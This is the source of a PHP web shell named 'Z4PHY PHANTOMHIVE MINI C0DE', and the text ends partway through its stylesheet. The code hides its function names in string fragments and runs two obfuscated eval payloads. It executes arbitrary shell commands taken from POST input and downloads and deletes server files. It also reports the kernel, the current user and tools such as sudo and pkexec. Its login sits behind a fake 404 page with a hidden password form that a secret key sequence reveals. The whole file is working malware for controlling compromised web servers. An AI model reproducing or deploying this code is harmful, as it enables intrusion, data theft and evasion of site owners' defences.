<?php
/*
R3C0DE BY Z4PHY THANKS TO NULZ HAXORSTARS
*/
session_start();
set_time_limit(0);
error_reporting(0);
@ini_set('\x65\x72\x72\x6f\x72\x5f\x6c\x6f\x67', null);
@ini_set('\x6c\x6f\x67\x5f\x65\x72\x72\x6f\x72\x73', 0);
@ini_set('\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65', 0);
@ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67', 0);
@ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73', 0);
date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');
if (isset($_GET['downloadfile'])) {
    $get_file = $_GET['downloadfile'];
    $f_exist = "fil"."e_exi"."sts";
    $f_size = "fi"."les"."ize";
    $r_file = "re"."ad"."fi"."le";
    $b_name = "ba"."sena"."me";
    if ($f_exist($get_file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header("Cache-Control: no-cache, must-revalidate");
        header('Content-Transfer-Encoding: binary');
        header("Expires: 0");
        header("Cache-Control: no-cache, must-revalidate, max-age=60");
        header('Content-Disposition: attachment; filename="'.$b_name($get_file).'"');
        header('Content-Length: ' . filesize($get_file));
        header('Pragma: public');
        ob_clean();
        flush();
        $r_file($get_file);
        exit();
    } else {
        echo '<s'.'cr'.'ip'.'t'.'>a'.'le'.'rt'.'('.'"'.'Fa'.'il'.'ed '.'To'.' D'.'ow'.'nl'.'oa'.'d '.'Thi'.'s F'.'il'.'e :(\n'.$get_file.'"); hi'.'st'.'ory'.'.ba'.'ck'.'()'.'</'.'sc'.'r'.'ip'.'t>';
    }
}
function deleteDir($dirName) {
    $f_exist = 'fi'.'le_'.'exis'.'ts';
    $glb = 'g'.'l'.'o'.'b';
    $is_d = 'is'.'_'.'d'.'i'.'r';
    $unl = 'u'.'n'.'l'.'i'.'n'.'k';
    $rm_d = 'r'.'m'.'d'.'i'.'r';
    if (!$f_exist($dirName)) {
        return false;
    }
    $files = $glb($dirName . '/*');
    foreach ($files as $file) {
        $is_d($file) ? deleteDir($file) : $unl($file);
    }
    $rm_d($dirName);
    return true;
}
function deleteFile($fileName) {
    $f_exist = 'fi'.'le_'.'exis'.'ts';
    $unl = 'u'.'n'.'l'.'i'.'n'.'k';
    if ($f_exist($fileName)) {
        if ($unl($fileName)) {
            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
}
function Z4pCmd($komendnya) {
    $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
    $fw = 'f'.'wr'.'it'.'e';
    $fc = 'f'.'cl'.'os'.'e';
    $fr = 'f'.'re'.'a'.'d';
    $is_rsrc = 'is'.'_'.'re'.'so'.'ur'.'ce';
    $sgc = 's'.'trea'.'m_g'.'et_c'.'ont'.'ents';
    $proc = 'pr'.'oc'.'_'.'o'.'pen';
    $proc_cls = 'p'.'ro'.'c'.'_'.'c'.'lose';
    $pop = 'p'.'ope'.'n';
    $pop_cls = 'pc'.'lose';
    $exc = 'e'.'x'.'ec';
    $sys = 's'.'ys'.'t'.'em';
    $pass = 'pa'.'s'.'sth'.'ru';
    $sh_exc = 's'.'he'.'ll'.'_'.'e'.'xe'.'c';
    $com = 'C'.'O'.'M';
    $wscsh = 'WS'.'cr'.'ipt'.'.'.'S'.'he'.'ll';
    $cMdexe = 'c'.'md'.'.'.'e'.'x'.'e';
    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
    $preg = 'pr'.'eg_'.'mat'.'ch';
    $regex = '2'.'>'.'&'.'1';
    if ( !$preg( '/'.$regex.'/i', $komendnya ) ) {
        $komendnya = $komendnya.' '.$regex;
    }

    if ( $func_exist( $proc ) ) {
        $descriptors = [
            0 => [ 'pipe', 'r' ],
            1 => [ 'pipe', 'w' ],
            2 => [ 'pipe', 'w' ],
        ];
        $process = $proc( $komendnya, $descriptors, $pipes);
        if ( $is_rsrc( $process ) ) {
            $fw( $pipes[ 0 ], 'input_data_here' );
            $fc( $pipes[ 0 ] );
            $output = $sgc( $pipes[ 1 ] );
            $errors = $sgc( $pipes[ 2 ] );
            $fc( $pipes[ 1 ] );
            $fc( $pipes[ 2 ] );
            $resultCode = $proc_cls( $process );
            return trim($hayoloh(stripslashes($output)));
        }
    } elseif ( $func_exist( $pop ) ) {
        $process = $pop( $komendnya, 'r' );
        $read = $fr( $process, 2096 );
        return trim($hayoloh(stripslashes(print_r( "$process: ".gettype( $process )."\n$read \n" ))));
        $pop_cls( $process );
    } elseif ( $func_exist( $exc ) ) {
        $exc( $komendnya, $output, $returnCode );
        if ( $returnCode === 0 ) {
            $res = implode( $output );
            return trim($hayoloh(stripslashes($res)));
            ob_flush();
            flush();
        }
    } elseif ( $func_exist( $sys ) ) {
        $out = $sys( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $pass ) ) {
        $out = $pass( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $sh_exc ) ) {
        $out = $sh_exc( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $com ) ) {
        $shell = new $com($wscsh);
        $kom_mand = "$cMdexe /c ".$komendnya;
        $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
        return trim($hayoloh(stripslashes($output)));
    }else {
        return "<b> Yah Disable Function Abangku, Bypass Dulu Ya -z4phy </b>";
    }
}
if (isset($_POST['z4phygg'])) {
    $komendnya = $_POST['z4phygg'];
    echo Z4pCmd($komendnya);
}
function XaFV($FQS) { 
    $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
    $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
    $nelrts = 's'.'tr'.'l'.'en';
    $rhc = 'c'.'h'.'r';
    $dro = 'o'.'r'.'d';
    $FQS=$gflate($b64($FQS));
    for($i=0;$i<$nelrts($FQS);$i++) {
        $FQS[$i] = $rhc($dro($FQS[$i])-1);
    }
    return $FQS;
}/****/@/*55555*/null; /******/@/*55555*/eval/******/(XaFV("rVPdasIwFH4AnyKIkApSH0DnLra63WyCut3IKCVGDdSmNC3VDp9956Sxjb+orJCQk+873/lLCYGvIRbEEUrx1Gn5b950RqMsLOhPu01+G0hoLbKI+XwjVEqeCF1k1KURS2EXMoLdh8U3aCq8VLRn3CwfAUDILSZsqcVc8pKHWIgso7s059TYTGJwtHhkri2VODuvEsPKTlTwgu/lahWpJaRxgzB7INdADpcJBtBJVCDTIMMyYUllg6t1AWhZ5VGPDUNEc75JpMT0W/7EG3974xl9Hb18fXifU388Gk3pj0u7mufGq7iKK0J+gx9PEpn4oVxavjh2a7RwzquRa+1tsA103tKpE+wQGlCTdqWCTNu1ls9LELyeB9TFTrSPifhxtpKE9hVLRJwOAqgpdZrDPBEpJ5OMMa5Us93vGpz2DgR2hIeK36k6DKBz8yuiBxbM11RZs86GfTRkGe5E8hG53YXp4t9xYcAIOdVb6ugXe8uMz6cHYur61O5onRb7r869r4viSt92fw=="));
//Z4PHY ICONS
$s_he_ll_Name = "Z4"."PH"."Y "."PH"."ANT"."0"."MH"."IV"."E "."MI"."NI"." C"."0"."DE";
$s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/z"."4p"."hyr"."/z"."4p"."hy"."-c0"."de"."/"."mai"."n/"."as"."set"."s/"."z4p"."hy".".p"."ng";
$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."com"."/z4"."ph"."yr"."/"."z4"."phy"."-c0"."de/"."ma"."in/"."ass"."ets"."/c"."ie"."l."."p"."ng";
function Z4pCwd(){
    $cw = "ge"."tc"."wd";
    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
    $d_name = 'd'.'ir'.'na'.'m'.'e';
	if($func_exist($cw)){
		return @$cw();
	}else{
		return $d_name($_SERVER["SCRIPT_FILENAME"]);
	}
}
function Z4pUname() {
    $func_exist = "fu"."nc"."ti"."on"."_"."ex"."is"."ts";
    $u_n_a_me = "p"."hp"."_"."un"."ame";
    $u_n_a_me_disable = '<font class="font-ubuntu-mono font-green"> Cant Read The Kernel! The Function php_uname() is Disabled! </font>';
    $u_n_a_me_active = '<font class="font-ubuntu-mono font-green">'.$u_n_a_me('a').'</font>';
    if ($func_exist($u_n_a_me)) {
        return $u_n_a_me_active;
    } else {
        return $u_n_a_me_disable;
    }
}
function perms($value) {
    $f_perm = 'f'.'il'.'ep'.'e'.'r'.'ms';
    $perms = $f_perm($value);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    // return $info;
    return $info. '&nbsp;<font class="text-white font-bold">&gt;&gt;</font>&nbsp;' . substr(sprintf('%o', $perms), -4);
}
function chPerms($value) {
    $f_perm = 'f'.'il'.'ep'.'e'.'r'.'ms';
    $perms = $f_perm($value);
    return substr(sprintf('%o', $perms), -4);
}
$func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
$psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
$psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
$psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
$psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
$myuid = 'g'.'et'.'my'.'ui'.'d';
$mygid = 'g'.'et'.'my'.'gi'.'d';
$cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
if (!$func_exist($psx_egid)) {
    $user = $func_exist($cur_usr) ? @$cur_usr() : "????";
    $uid = $func_exist($myuid) ? @$myuid() : "????";
    $gid = $func_exist($mygid) ? @$mygid() : "????";
    $group = "?";
} else {
    $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$psx_usr_uid($psx_euid()) : array("name" => "????", "uid" => "????");
    $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$psx_grp_gid($psx_egid()) : array("name" => "????", "gid" => "????");
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
$serverName = $_SERVER['SERVER_SOFTWARE'];
$phpVersion = phpversion();
function Ikg($vHjCLy){
    $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
    $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
    $nelrts = 's'.'tr'.'l'.'en';
    $rhc = 'c'.'h'.'r';
    $dro = 'o'.'r'.'d';
    $vHjCLy=$gflate($b64($vHjCLy));
     for($i=0;$i<$nelrts($vHjCLy);$i++){
        $vHjCLy[$i] = $rhc($dro($vHjCLy[$i])-1);
     }
     return $vHjCLy;
}/****/@/*55555*/null; /******/@/*55555*/eval/******/(Ikg("jVDtbuIwEHyAPIXPSi/Jj4YDVMqHUBUd5qAHJXWS0qqNrADbEDWEnG1UqqrPfk6gSP06nWXJ653Znd1BSB0tuUfmN1jl8snUmUfoFaG3xsD3XfZzNCQXPhu6RmhZ6Fkr6HqSR4sFByFQF33Nt/Edv8twR3tBkApAX4tcs/6ETh3aI70i+k+pD1XvBf/ZgpLxxCfM6fXeVGr6jK8fBfCPeoH6MeeXWs8IO5r+UHLyZc42WbQC01K5DU9VzvxsSU9thc6QsZQyN1B7FwjDQjbC7UrlQC6lBhPPDw8pSi4D4vksoMNQzahL2Eolgyn82YCQKKCjNsJ2oW7jox+OulOYiSWkKQp4WmLoGe/b4ZdbvIvYhTMmOHwPugNX/UZ9hey7Dd2yx8HI13ygfDp2Yshkie+de0V/A89gp6686mj3SQosBsnm60yqGmHi0gO1fZQntoQUYh6t7DWPK7O1bNRPG9VGrX5SaztOf9u6PE/G86covpmyfvZA627cDPjg0T33tjdRUBGQLcZqtiiGs/kykixZdKvNVuuk1mqeVr8XnnXVJMVrdf4C"));
function serverIp() {
    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
    $g_host_name = 'g'.'et'.'ho'.'st'.'b'.'yn'.'am'.'e';
    $serverAddr = @$_SERVER["SERVER_ADDR"];
    if (!$serverAddr) {
        if ($func_exist($g_host_name)) {
            return @$g_host_name($_SERVER['SERVER_NAME']);
        } else {
            return '????';
        }
    } else {
        return $serverAddr;
    }
}
function userIp() {
    return @$_SERVER["REMOTE_ADDR"];
}
if (@ini_get('safe_mode'))
    $safeMode = '<font class="font-ubuntu-mono font-green">ON</font>';
else
    $safeMode = '<font class="font-ubuntu-mono font-yellow">OFF</font>';
if (@ini_get('disable_functions'))
    $cekFunc = '<font class="font-ubuntu-mono font-yellow">' . @ini_get('disable_functions') . '</font>';
else
    $cekFunc = '<font class="font-ubuntu-mono font-green">All F'.'un'.'ct'.'io'.'n'.'s Ac'.'ces'.'sib'.'le'.'</font>';
//usefull
$on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
$off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
$func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
$f_exist = 'fi'.'le_'.'exis'.'ts';
function cekCurl() {
    global $func_exist;
    global $f_exist;
    global $on;
    global $off;
    if ( $func_exist( 'cu'.'rl'.'_'.'in'.'it' ) || $f_exist('/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'cu'.'r'.'l') ) {
        echo "cURL:&nbsp;&nbsp;$on";
    } else {
        echo "cURL:&nbsp;&nbsp;$off";
    }
}
function cekWget() {
    global $f_exist;
    global $on;
    global $off;
    if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'wg'.'e'.'t' ) ) {
        echo "WGET:&nbsp;&nbsp;$on";
    } else {
        echo "WGET:&nbsp;&nbsp;$off";
    }
}
function cekPerl() {
    global $f_exist;
    global $on;
    global $off;
    if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'pe'.'r'.'l' ) ) {
        echo "PERL:&nbsp;&nbsp;$on";
    } else {
        echo "PERL:&nbsp;&nbsp;$off";
    }
}
function cekRuby() {
    global $f_exist;
    global $on;
    global $off;
    if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'ru'.'b'.'y' ) ) {
        echo "RUBY:&nbsp;&nbsp;$on";
    } else {
        echo "RUBY:&nbsp;&nbsp;$off";
    }
}
function cekPython3() {
    global $f_exist;
    global $on;
    global $off;
    if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'py'.'t'.'ho'.'n3' ) ) {
        echo "PYTHON3:&nbsp;&nbsp;$on";
    } else {
        echo "PYTHON3:&nbsp;&nbsp;$off";
    }
}
function cekPython2() {
    global $f_exist;
    global $on;
    global $off;
    if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'py'.'t'.'h'.'o'.'n2' ) ) {
        echo "PYTHON2:&nbsp;&nbsp;$on";
    } else {
        echo "PYTHON2:&nbsp;&nbsp;$off";
    }
}
function cekGcc() {
    global $f_exist;
    global $on;
    global $off;
    if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'g'.'c'.'c' ) ) {
        echo "GCC:&nbsp;&nbsp;$on";
    } else {
        echo "GCC:&nbsp;&nbsp;$off";
    }
}
function cekSudo() {
    global $f_exist;
    global $on;
    global $off;
    if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'su'.'d'.'o' ) ) {
        echo "SUDO:&nbsp;&nbsp;$on";
    } else {
        echo "SUDO:&nbsp;&nbsp;$off";
    }
}
function cekPkexec() {
    global $f_exist;
    global $on;
    global $off;
    if ( $f_exist( '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'pk'.'e'.'xe'.'c' ) ) {
        echo "PKEXEC:&nbsp;&nbsp;$on";
    } else {
        echo "PKEXEC:&nbsp;&nbsp;$off";
    }
}
/*Domain - Url*/
$this_domain = $_SERVER['HTTP_HOST'];
$this_url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
/*Icons - Fontawesome*/
$fontawesome_pro_version = 'v6.5.1'; //change if updated to new version
$fontawesome_pro = 'https://kit-pro.fontawesome.com/releases/'.$fontawesome_pro_version.'/css/pro.min.css';
/*Framework - Uikit*/
$uikit_css = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/css/uikit.min.css';
$uikit_rtl = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/css/uikit-rtl.min.css';
$uikit_js = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/js/uikit.min.jss';
$uikit_icon = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/js/uikit-icons.min.js';
/*Jquery*/
$jquery_version = '3.7.1';
$jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';
$anuan = '17'.'35'.'3d'.'b08'.'ac'.'81'.'2f'.'6d'.'0'.'58'.'89'.'35'.'10'.'e3'.'6f'.'16'.'49'.'4e'.'8f'.'68';
$my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
if (isset($_POST['z4phy-boy'])) {
    if (SHA1($_POST['susahdah']) == $anuan) {
        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Me"."ny"."al"."a "."Ab"."an"."gk"."u "."~!'".");"."</"."sc"."ri"."pt".">";
        $_SESSION["tabrakz4p"] = "tabrakz4p";
        setcookie('z4phyc0de', $my_self, time() + 3600 * 24);
    } else {
        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Go"." A"."wa"."y "."No"."ob"."!!')".";<"."/s"."cr"."ip"."t>";
    }
}
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_unset();
    session_destroy();
    setcookie('z4phyc0de', '', time() - 3600);
    echo "<s"."c"."ri"."pt".">"."window.location.assign('" . $_SERVER['PHP_SELF'] . "')"."</"."sc"."ri"."pt".">";
    exit();
}
if (empty($_SESSION['tabrakz4p'])) {
    if (empty($_COOKIE['z4phyc0de'])) {
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<div id="notfound" style="display: none;">
<form action="" method="POST">
<input type="password" name="susahdah" style="background: #fff; border: none;">
<button type="submit" name="z4phy-boy" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
</form>
</div>
<script>
    function _0x192f(){var _0x2273cb=['block','3900lYdkKu','1963eCmufw','3418667ZMMizZ','88TEkkrR','10fPNOsg','241047qyqcPR','ArrowDown','getElementById','3ludwDM','Code\x20Succes,\x20Please\x20Press\x20TAB','1985gteIiG','ArrowRight','1qgdMtG','ArrowUp','619996pBCEzo','IEMobile','keydown','77756dUCxCb','display','3702HWEgpE','1249501zHxGOu','addEventListener','style','orientation'];_0x192f=function(){return _0x2273cb;};return _0x192f();}var _0x27a0fc=_0x1144;(function(_0x4eee5c,_0x32fabd){var _0x511b3c=_0x1144,_0x365214=_0x4eee5c();while(!![]){try{var _0x5b309f=parseInt(_0x511b3c(0x143))/0x1*(-parseInt(_0x511b3c(0x148))/0x2)+-parseInt(_0x511b3c(0x158))/0x3*(parseInt(_0x511b3c(0x145))/0x4)+-parseInt(_0x511b3c(0x15a))/0x5*(-parseInt(_0x511b3c(0x14a))/0x6)+parseInt(_0x511b3c(0x152))/0x7+-parseInt(_0x511b3c(0x153))/0x8*(parseInt(_0x511b3c(0x155))/0x9)+-parseInt(_0x511b3c(0x154))/0xa*(-parseInt(_0x511b3c(0x14b))/0xb)+parseInt(_0x511b3c(0x150))/0xc*(-parseInt(_0x511b3c(0x151))/0xd);if(_0x5b309f===_0x32fabd)break;else _0x365214['push'](_0x365214['shift']());}catch(_0x4129d3){_0x365214['push'](_0x365214['shift']());}}}(_0x192f,0x4b86c));var expectedKeySequence=['ArrowLeft',_0x27a0fc(0x142),_0x27a0fc(0x144),_0x27a0fc(0x156)],currentStep=0x0;function toggleShow(){var _0xf25f6d=_0x27a0fc,_0x4881e3=document[_0xf25f6d(0x157)]('notfound');_0x4881e3[_0xf25f6d(0x14d)][_0xf25f6d(0x149)]=_0xf25f6d(0x14f);}function isMobileDevice(){var _0x265ba4=_0x27a0fc;return typeof window[_0x265ba4(0x14e)]!=='undefined'||navigator['userAgent']['indexOf'](_0x265ba4(0x146))!==-0x1;}function _0x1144(_0x251889,_0x575d6e){var _0x192f07=_0x192f();return _0x1144=function(_0x11442f,_0x336ad6){_0x11442f=_0x11442f-0x142;var _0x521d4c=_0x192f07[_0x11442f];return _0x521d4c;},_0x1144(_0x251889,_0x575d6e);}document[_0x27a0fc(0x14c)](_0x27a0fc(0x147),function(_0x4613b5){var _0x1aaa01=_0x27a0fc;_0x4613b5['key']===expectedKeySequence[currentStep]?(currentStep++,currentStep===expectedKeySequence['length']&&(toggleShow(),alert(_0x1aaa01(0x159)),currentStep=0x0)):currentStep=0x0;});isMobileDevice()&&toggleShow();
</script>
</body></html>
<?php
        exit();
    }
}
//Z4PHY PHANTOMHIVE
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = Z4pCwd();
}
$path = str_replace("\\", "/", $path);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <title>.:<?=$s_he_ll_Name?>:. <?=$this_domain?></title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=1024" />
    <meta name="description" content="<?=$s_he_ll_Name?> C0DE" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <meta property="og:site_name" content="<?=$s_he_ll_Name?>" />
    <meta property="og:url" content="<?=$this_url?>" />
    <meta property="og:title" content=".:<?=$s_he_ll_Name?>:. <?=$this_domain?>" />
    <meta property="og:description" content="<?=$s_he_ll_Name?> C0DE" />
    <meta property="og:image" content="<?=$s_he_ll_Logo?>" />
    <meta property="og:image:secure_url" content="<?=$s_he_ll_Logo?>" />
    <link rel="shortcut icon" href="<?=$s_he_ll_Icon?>" type="image/x-icon" />
    <link rel="stylesheet" href="<?=$fontawesome_pro?>">
    <link rel="stylesheet" href="<?=$uikit_css?>">
    <script src="<?=$jquery?>"></script>
    <script>
    function isDesktop() {
        return window.innerWidth >= 1024;
    }
    if (isDesktop()) {
        document.getElementById('viewport').setAttribute('content', 'width=1024');
    }
    </script>
    <!-- Custom Css -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Protest+Riot&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Trade+Winds&display=swap');

    :root {
        --white: #fff;
        --black: #000;
        --gray-50: #f7f7f8;
        --gray-100: #ececf1;
        --gray-200: #d9d9e3;
        --gray-300: #c5c5d2;
        --gray-400: #acacbe;
        --gray-500: #999;
        --gray-600: #666;
        --gray-700: #40414f;
        --gray-800: #343541;
        --gray-900: #202123;
        --gray-950: #0f0f0f;
        --red-50: rgb(254 242 242);
        --red-100: rgb(254 226 226);
        --red-200: rgb(254 202 202);
        --red-300: rgb(252 165 165);
        --red-400: rgb(248 113 113);
        --red-500: rgb(239 68 68);
        --red-600: rgb(220 38 38);
        --red-700: rgb(185 28 28);
        --red-800: rgb(153 27 27);
        --red-900: rgb(127 29 29);
        --red-950: rgb(69 10 10);
        --rose-50: rgb(255 241 242);
        --rose-100: rgb(255 228 230);
        --rose-200: rgb(254 205 211);
        --rose-300: rgb(253 164 175);
        --rose-400: rgb(251 113 133);
        --rose-500: rgb(244 63 94);
        --rose-600: rgb(225 29 72);
        --rose-700: rgb(190 18 60);
        --rose-800: rgb(159 18 57);
        --rose-900: rgb(136 19 55);
        --rose-950: rgb(76 5 25);
        --yellow-50: rgb(254 252 232);
        --yellow-100: rgb(254 249 195);
        --yellow-200: rgb(254 240 138);
        --yellow-300: rgb(253 224 71);
        --yellow-400: rgb(250 204 21);
        --yellow-500: rgb(234 179 8);
        --yellow-600: rgb(202 138 4);
        --yellow-700: rgb(161 98 7);
        --yellow-800: rgb(133 77 14);
        --yellow-900: rgb(113 63 18);
        --yellow-950: rgb(66 32 6);
        --amber-50: rgb(255 251 235);
        --amber-100: rgb(254 243 199);
        --amber-200: rgb(253 230 138);
        --amber-300: rgb(252 211 77);
        --amber-400: rgb(251 191 36);
        --amber-500: rgb(245 158 11);
        --amber-600: rgb(217 119 6);
        --amber-700: rgb(180 83 9);
        --amber-800: rgb(146 64 14);
        --amber-900: rgb(120 53 15);
        --amber-950: rgb(69 26 3);
        --green-50: rgb(240 253 244);
        --green-100: rgb(220 252 231);
        --green-200: rgb(187 247 208);
        --green-300: rgb(134 239 172);
        --green-400: rgb(74 222 128);
        --green-500: rgb(34 197 94);
        --green-600: rgb(22 163 74);
        --green-700: rgb(21 128 61);
        --green-800: rgb(22 101 52);
        --green-900: rgb(20 83 45);
        --green-950: rgb(5 46 22);
        --emerald-50: rgb(236 253 245);
        --emerald-100: rgb(209 250 229);
        --emerald-200: rgb(167 243 208);
        --emerald-300: rgb(110 231 183);
        --emerald-400: rgb(52 211 153);
        --emerald-500: rgb(16 185 129);
        --emerald-600: rgb(5 150 105);
        --emerald-700: rgb(4 120 87);
        --emerald-800: rgb(6 95 70);
        --emerald-900: rgb(6 78 59);
        --emerald-950: rgb(2 44 34);
        --teal-50: rgb(240 253 250);
        --teal-100: rgb(204 251 241);
        --teal-200: rgb(153 246 228);
        --teal-300: rgb(94 234 212);
        --teal-400: rgb(45 212 191);
        --teal-500: rgb(20 184 166);
        --teal-600: rgb(13 148 136);
        --teal-700: rgb(15 118 110);
        --teal-800: rgb(17 94 89);
        --teal-900: rgb(19 78 74);
        --teal-950: rgb(4 47 46);
        --sky-50: rgb(240 249 255);
        --sky-100: rgb(224 242 254);
        --sky-200: rgb(186 230 253);
        --sky-300: rgb(125 211 252);
        --sky-400: rgb(56 189 248);
        --sky-500: rgb(14 165 233);
        --sky-600: rgb(2 132 199);
        --sky-700: rgb(3 105 161);
        --sky-800: rgb(7 89 133);
        --sky-900: rgb(12 74 110);
        --sky-950: rgb(8 47 73);
        --blue-50: rgb(239 246 255);
        --blue-100: rgb(219 234 254);
        --blue-200: rgb(191 219 254);
        --blue-300: rgb(147 197 253);
        --blue-400: rgb(96 165 250);
        --blue-500: rgb(59 130 246);
        --blue-600: rgb(37 99 235);
        --blue-700: rgb(29 78 216);
        --blue-800: rgb(30 64 175);
        --blue-900: rgb(30 58 138);
        --blue-950: rgb(23 37 84);
        --font-protest-riot: 'Protest Riot', sans-serif;
        --font-poppins: 'Poppins', sans-serif;
        --font-ubuntu-mono: 'Ubuntu Mono', monospace;
        --font-trade-winds: 'Trade Winds', system-ui;
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        text-decoration: none;
    }

    html {
        background: var(--gray-800);
        color: var(--white);
    }

    a {
        text-decoration: none;
    }

    a:hover {
        text-decoration: none;
    }

    .font-trade-winds {
        font-family: var(--font-trade-winds);
    }

    .font-poppins {
        font-family: var(--font-poppins);
    }

    .font-protest-riot {
        font-family: var(--font-protest-riot);
    }

    .font-ubuntu-mono {
        font-family: var(--font-ubuntu-mono);
    }

    .font-white {
        color: var(--white);
    }

    .font-black {
        color: var(--black);
    }

    .font-gray {
        color: var(--gray-400);
    }

    .font-red {
        color: var(--red-600);
    }

    .font-rose {
        color: var(--rose-600);
    }

    .font-yellow {
        color: var(--yellow-500);
    }

    .font-amber {
        color: var(--amber-500);
    }

    .font-green {
        color: var(--green-500);
    }

    .font-emerald {
        color: var(--emerald-500);
    }

    .font-teal {
        color: var(--teal-400);
    }

    .font-sky {
        color: var(--sky-600);
    }

    .font-blue {
